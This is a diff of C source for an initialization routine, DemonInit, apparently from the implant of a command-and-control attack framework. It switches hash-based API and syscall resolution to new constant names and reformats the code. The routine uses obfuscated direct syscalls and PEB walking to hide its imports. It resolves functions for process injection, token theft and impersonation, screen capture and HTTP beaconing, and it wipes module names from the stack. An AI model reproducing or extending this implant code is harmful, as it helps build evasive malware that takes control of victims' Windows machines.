-        Instance.Syscall.NtTerminateThread                 = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtTerminateThread );
-        Instance.Syscall.NtWriteVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtWriteVirtualMemory );
-        Instance.Syscall.NtContinue                        = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtContinue );
-        Instance.Syscall.NtReadVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtReadVirtualMemory );
-        Instance.Syscall.NtFreeVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtFreeVirtualMemory );
-        Instance.Syscall.NtQueryVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryVirtualMemory );
-        Instance.Syscall.NtQueryInformationToken           = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryInformationToken );
-        Instance.Syscall.NtQueryObject                     = SyscallsObf( Syscalls, SyscallCounter, FuncHash_NtQueryObject );
+        Instance.Syscall.NtOpenProcess                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENPROCESS );
+        Instance.Syscall.NtQueryInformationProcess      = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYINFORMATIONPROCESS );
+        Instance.Syscall.NtQuerySystemInformation       = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYSYSTEMINFORMATION );
+        Instance.Syscall.NtAllocateVirtualMemory        = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTALLOCATEVIRTUALMEMORY );
+        Instance.Syscall.NtQueueApcThread               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUEUEAPCTHREAD );
+        Instance.Syscall.NtOpenThread                   = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENTHREAD );
+        Instance.Syscall.NtResumeThread                 = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTRESUMETHREAD );
+        Instance.Syscall.NtSuspendThread                = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSUSPENDTHREAD );
+        Instance.Syscall.NtCreateEvent                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCREATEEVENT );
+        Instance.Syscall.NtDuplicateObject              = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTDUPLICATEOBJECT );
+        Instance.Syscall.NtGetContextThread             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTGETCONTEXTTHREAD );
+        Instance.Syscall.NtSetContextThread             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSETCONTEXTTHREAD );
+        Instance.Syscall.NtWaitForSingleObject          = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTWAITFORSINGLEOBJECT );
+        Instance.Syscall.NtAlertResumeThread            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTALERTRESUMETHREAD );
+        Instance.Syscall.NtSignalAndWaitForSingleObject = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
+        Instance.Syscall.NtTestAlert                    = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTTESTALERT );
+        Instance.Syscall.NtCreateThreadEx               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCREATETHREADEX );
+        Instance.Syscall.NtOpenProcessToken             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENPROCESSTOKEN );
+        Instance.Syscall.NtDuplicateToken               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTDUPLICATETOKEN );
+        Instance.Syscall.NtProtectVirtualMemory         = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTPROTECTVIRTUALMEMORY );
+        Instance.Syscall.NtTerminateThread              = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTTERMINATETHREAD );
+        Instance.Syscall.NtWriteVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTWRITEVIRTUALMEMORY );
+        Instance.Syscall.NtContinue                     = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCONTINUE );
+        Instance.Syscall.NtReadVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTREADVIRTUALMEMORY );
+        Instance.Syscall.NtFreeVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTFREEVIRTUALMEMORY );
+        Instance.Syscall.NtQueryVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYVIRTUALMEMORY );
+        Instance.Syscall.NtQueryInformationToken        = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYINFORMATIONTOKEN );
+        Instance.Syscall.NtQueryObject                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYOBJECT );
 
         MemSet( Syscalls, 0, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
         Instance.Win32.LocalFree( Syscalls );
         Syscalls = NULL;
 
-        // Restore ntdll from PEB
-        Instance.Modules.Ntdll                             = LdrModulePeb( HASH_NTDLL );
-        PUTS( "END OF OBFUSCATED" )
+        /* restore ntdll */
+        Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL );
     }
     else
 #endif
     {
         PUTS( "Using Native functions..." )
-        Instance.Syscall.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenProcess );
-        Instance.Syscall.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationProcess );
-        Instance.Syscall.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQuerySystemInformation );
-        Instance.Syscall.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtAllocateVirtualMemory );
-        Instance.Syscall.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueueApcThread );
-        Instance.Syscall.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenThread );
-        Instance.Syscall.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtResumeThread );
-        Instance.Syscall.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSuspendThread );
-        Instance.Syscall.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateEvent );
-        Instance.Syscall.NtDuplicateObject                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtDuplicateObject );
-        Instance.Syscall.NtGetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtGetContextThread );
-        Instance.Syscall.NtSetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSetContextThread );
-        Instance.Syscall.NtWaitForSingleObject             = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtWaitForSingleObject );
-        Instance.Syscall.NtAlertResumeThread               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtAlertResumeThread );
-        Instance.Syscall.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtSignalAndWaitForSingleObject );
-        Instance.Syscall.NtTestAlert                       = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtTestAlert );
-        Instance.Syscall.NtCreateThreadEx                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtCreateThreadEx );
-        Instance.Syscall.NtOpenProcessToken                = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtOpenProcessToken );
-        Instance.Syscall.NtDuplicateToken                  = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtDuplicateToken );
-        Instance.Syscall.NtProtectVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtProtectVirtualMemory  );
-        Instance.Syscall.NtTerminateThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtTerminateThread );
-        Instance.Syscall.NtWriteVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtWriteVirtualMemory );
-        Instance.Syscall.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtContinue );
-        Instance.Syscall.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtReadVirtualMemory );
-        Instance.Syscall.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtFreeVirtualMemory );
-        Instance.Syscall.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryVirtualMemory );
-        Instance.Syscall.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationToken );
-        Instance.Syscall.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryInformationThread );
-        Instance.Syscall.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, FuncHash_NtQueryObject );
+        Instance.Syscall.NtOpenProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESS );
+        Instance.Syscall.NtQueryInformationProcess      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
+        Instance.Syscall.NtQuerySystemInformation       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
+        Instance.Syscall.NtAllocateVirtualMemory        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
+        Instance.Syscall.NtQueueApcThread               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
+        Instance.Syscall.NtOpenThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREAD );
+        Instance.Syscall.NtResumeThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
+        Instance.Syscall.NtSuspendThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
+        Instance.Syscall.NtCreateEvent                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
+        Instance.Syscall.NtDuplicateObject              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
+        Instance.Syscall.NtGetContextThread             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
+        Instance.Syscall.NtSetContextThread             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
+        Instance.Syscall.NtWaitForSingleObject          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
+        Instance.Syscall.NtAlertResumeThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
+        Instance.Syscall.NtSignalAndWaitForSingleObject = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
+        Instance.Syscall.NtTestAlert                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTESTALERT );
+        Instance.Syscall.NtCreateThreadEx               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
+        Instance.Syscall.NtOpenProcessToken             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
+        Instance.Syscall.NtDuplicateToken               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
+        Instance.Syscall.NtProtectVirtualMemory         = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTPROTECTVIRTUALMEMORY  );
+        Instance.Syscall.NtTerminateThread              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATETHREAD );
+        Instance.Syscall.NtWriteVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWRITEVIRTUALMEMORY );
+        Instance.Syscall.NtContinue                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCONTINUE );
+        Instance.Syscall.NtReadVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
+        Instance.Syscall.NtFreeVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
+        Instance.Syscall.NtQueryVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
+        Instance.Syscall.NtQueryInformationToken        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
+        Instance.Syscall.NtQueryInformationThread       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
+        Instance.Syscall.NtQueryObject                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
     }
 
     ModuleName[ 0 ] = 'A';
@@ -649,201 +641,198 @@ VOID DemonInit( VOID )
     ModuleName[ 3 ] = 'i';
     Instance.Modules.Sspicli = LdrModuleLoad( ModuleName );
 
-    MemSet( ModuleName, 0, 20 );
+    /* zero out the module name from the stack */
+    MemZero( ModuleName, sizeof( ModuleName ) );
 
-    // TODO: sort function (library)
-
-    if ( Instance.Modules.Advapi32 )
-    {
-        Instance.Win32.GetTokenInformation                 = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetTokenInformation );
-        Instance.Win32.CreateProcessWithTokenW             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CreateProcessWithTokenW );
-        Instance.Win32.CreateProcessWithLogonW             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CreateProcessWithLogonW );
-        Instance.Win32.RevertToSelf                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_RevertToSelf );
-        Instance.Win32.GetUserNameA                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetUserNameA );
-        Instance.Win32.LogonUserA                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserA );
-        Instance.Win32.LogonUserW                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserW );
-        Instance.Win32.LookupPrivilegeValueA               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupPrivilegeValueA );
-        Instance.Win32.LookupAccountSidA                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupAccountSidA );
-        Instance.Win32.OpenThreadToken                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_OpenThreadToken );
-        Instance.Win32.OpenProcessToken                    = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_OpenProcessToken );
-        Instance.Win32.ImpersonateLoggedOnUser             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_ImpersonateLoggedOnUser );
-        Instance.Win32.AdjustTokenPrivileges               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AdjustTokenPrivileges );
-        Instance.Win32.LookupPrivilegeNameA                = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupPrivilegeNameA );
-        Instance.Win32.SystemFunction032                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SystemFunction032 );
-        Instance.Win32.FreeSid                             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_FreeSid );
-        Instance.Win32.SetSecurityDescriptorSacl           = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetSecurityDescriptorSacl );
-        Instance.Win32.SetSecurityDescriptorDacl           = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetSecurityDescriptorDacl );
-        Instance.Win32.InitializeSecurityDescriptor        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeSecurityDescriptor );
-        Instance.Win32.AddMandatoryAce                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AddMandatoryAce );
-        Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeAcl );
-        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AllocateAndInitializeSid );
-        Instance.Win32.CheckTokenMembership                = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CheckTokenMembership );
-        Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetEntriesInAclW );
-        Instance.Win32.SetThreadToken                      = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetThreadToken );
-        Instance.Win32.LsaNtStatusToWinError               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LsaNtStatusToWinError );
-        Instance.Win32.EqualSid                            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_EqualSid );
-        Instance.Win32.ConvertSidToStringSidW              = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_ConvertSidToStringSidW );
+    /* load advapi32.dll functions */
+    if ( Instance.Modules.Advapi32 ) {
+        Instance.Win32.GetTokenInformation          = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
+        Instance.Win32.CreateProcessWithTokenW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
+        Instance.Win32.CreateProcessWithLogonW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
+        Instance.Win32.RevertToSelf                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_REVERTTOSELF );
+        Instance.Win32.GetUserNameA                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETUSERNAMEA );
+        Instance.Win32.LogonUserW                   = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOGONUSERW );
+        Instance.Win32.LookupPrivilegeValueA        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
+        Instance.Win32.LookupAccountSidA            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
+        Instance.Win32.LookupAccountSidW            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
+        Instance.Win32.OpenThreadToken              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
+        Instance.Win32.OpenProcessToken             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
+        Instance.Win32.ImpersonateLoggedOnUser      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_IMPERSONATELOGGEDONUSER );
+        Instance.Win32.AdjustTokenPrivileges        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
+        Instance.Win32.LookupPrivilegeNameA         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
+        Instance.Win32.SystemFunction032            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
+        Instance.Win32.FreeSid                      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_FREESID );
+        Instance.Win32.SetSecurityDescriptorSacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
+        Instance.Win32.SetSecurityDescriptorDacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
+        Instance.Win32.InitializeSecurityDescriptor = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
+        Instance.Win32.AddMandatoryAce              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
+        Instance.Win32.InitializeAcl                = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZEACL );
+        Instance.Win32.AllocateAndInitializeSid     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
+        Instance.Win32.CheckTokenMembership         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
+        Instance.Win32.SetEntriesInAclW             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
+        Instance.Win32.SetThreadToken               = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
+        Instance.Win32.LsaNtStatusToWinError        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
+        Instance.Win32.EqualSid                     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_EQUALSID );
+        Instance.Win32.ConvertSidToStringSidW       = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
 
         PUTS( "Loaded Advapi32 functions" )
     }
 
-    if ( Instance.Modules.Oleaut32 )
-    {
-        Instance.Win32.SafeArrayAccessData                 = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayAccessData );
-        Instance.Win32.SafeArrayUnaccessData               = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayUnaccessData );
-        Instance.Win32.SafeArrayCreate                     = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayCreate );
-        Instance.Win32.SafeArrayPutElement                 = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayPutElement );
-        Instance.Win32.SafeArrayCreateVector               = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayCreateVector );
-        Instance.Win32.SafeArrayDestroy                    = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayDestroy );
-        Instance.Win32.SysAllocString                      = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SysAllocString );
+    /* load oleout32.dll functions */
+    if ( Instance.Modules.Oleaut32 ) {
+        Instance.Win32.SafeArrayAccessData   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
+        Instance.Win32.SafeArrayUnaccessData = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
+        Instance.Win32.SafeArrayCreate       = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
+        Instance.Win32.SafeArrayPutElement   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
+        Instance.Win32.SafeArrayCreateVector = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
+        Instance.Win32.SafeArrayDestroy      = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
+        Instance.Win32.SysAllocString        = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );
 
         PUTS( "Loaded Oleaut32 functions" )
     }
 
-    if ( Instance.Modules.Shell32 )
-    {
-        Instance.Win32.CommandLineToArgvW                  = LdrFunctionAddr( Instance.Modules.Shell32, FuncHash_CommandLineToArgvW );
+    /* load shell32.dll functions */
+    if ( Instance.Modules.Shell32 ) {
+        Instance.Win32.CommandLineToArgvW = LdrFunctionAddr( Instance.Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
 
         PUTS( "Loaded Shell32 functions" )
     }
 
-    if ( Instance.Modules.Msvcrt )
-    {
-        Instance.Win32.vsnprintf                           = LdrFunctionAddr( Instance.Modules.Msvcrt, FuncHash_vsnprintf );
+    /* load msvcrt.dll functions */
+    if ( Instance.Modules.Msvcrt ) {
+        Instance.Win32.vsnprintf = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
 
         PUTS( "Loaded Msvcrt functions" )
     }
 
-    if ( Instance.Modules.User32 )
-    {
-        Instance.Win32.ShowWindow                          = LdrFunctionAddr( Instance.Modules.User32, FuncHash_ShowWindow );
-        Instance.Win32.GetSystemMetrics                    = LdrFunctionAddr( Instance.Modules.User32, FuncHash_GetSystemMetrics );
-        Instance.Win32.GetDC                               = LdrFunctionAddr( Instance.Modules.User32, FuncHash_GetDC );
-        Instance.Win32.ReleaseDC                           = LdrFunctionAddr( Instance.Modules.User32, FuncHash_ReleaseDC );
+    /* load user32.dll functions */
+    if ( Instance.Modules.User32 ) {
+        Instance.Win32.ShowWindow       = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_SHOWWINDOW );
+        Instance.Win32.GetSystemMetrics = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETSYSTEMMETRICS );
+        Instance.Win32.GetDC            = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETDC );
+        Instance.Win32.ReleaseDC        = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_RELEASEDC );
 
         PUTS( "Loaded User32 functions" )
     }
 
-    if ( Instance.Modules.Gdi32 )
-    {
-        Instance.Win32.GetCurrentObject                    = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_GetCurrentObject );
-        Instance.Win32.GetObjectW                          = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_GetObjectW );
-        Instance.Win32.CreateCompatibleDC                  = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_CreateCompatibleDC );
-        Instance.Win32.CreateDIBSection                    = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_CreateDIBSection );
-        Instance.Win32.SelectObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_SelectObject );
-        Instance.Win32.BitBlt                              = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_BitBlt );
-        Instance.Win32.DeleteObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_DeleteObject );
-        Instance.Win32.DeleteDC                            = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_DeleteDC );
+    /* load gdi32.dll functions */
+    if ( Instance.Modules.Gdi32 ) {
+        Instance.Win32.GetCurrentObject   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
+        Instance.Win32.GetObjectW         = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETOBJECTW );
+        Instance.Win32.CreateCompatibleDC = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
+        Instance.Win32.CreateDIBSection   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
+        Instance.Win32.SelectObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_SELECTOBJECT );
+        Instance.Win32.BitBlt             = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_BITBLT );
+        Instance.Win32.DeleteObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEOBJECT );
+        Instance.Win32.DeleteDC           = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEDC );
 
         PUTS( "Loaded Gdi32 functions" )
     }
 
-    if ( Instance.Modules.KernelBase )
-    {
-        Instance.Win32.SetProcessValidCallTargets          = LdrFunctionAddr( Instance.Modules.KernelBase, FuncHash_SetProcessValidCallTargets );
+    if ( Instance.Modules.KernelBase ) {
+        Instance.Win32.SetProcessValidCallTargets = LdrFunctionAddr( Instance.Modules.KernelBase, H_FUNC_SETPROCESSVALIDCALLTARGETS );
 
         PUTS( "Loaded KernelBase functions" )
     }
 
-    // WinHttp
 #ifdef TRANSPORT_HTTP
+    /* load winhttp.dll functions */
     if ( Instance.Modules.WinHttp )
     {
-        Instance.Win32.WinHttpOpen                         = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpOpen );
-        Instance.Win32.WinHttpConnect                      = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpConnect );
-        Instance.Win32.WinHttpOpenRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpOpenRequest );
-        Instance.Win32.WinHttpSetOption                    = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpSetOption );
-        Instance.Win32.WinHttpCloseHandle                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpCloseHandle );
-        Instance.Win32.WinHttpSendRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpSendRequest );
-        Instance.Win32.WinHttpAddRequestHeaders            = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpAddRequestHeaders );
-        Instance.Win32.WinHttpReceiveResponse              = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpReceiveResponse );
-        Instance.Win32.WinHttpWebSocketCompleteUpgrade     = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpWebSocketCompleteUpgrade  );
-        Instance.Win32.WinHttpQueryDataAvailable           = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpQueryDataAvailable );
-        Instance.Win32.WinHttpReadData                     = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpReadData );
-        Instance.Win32.WinHttpQueryHeaders                 = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpQueryHeaders );
+        Instance.Win32.WinHttpOpen              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
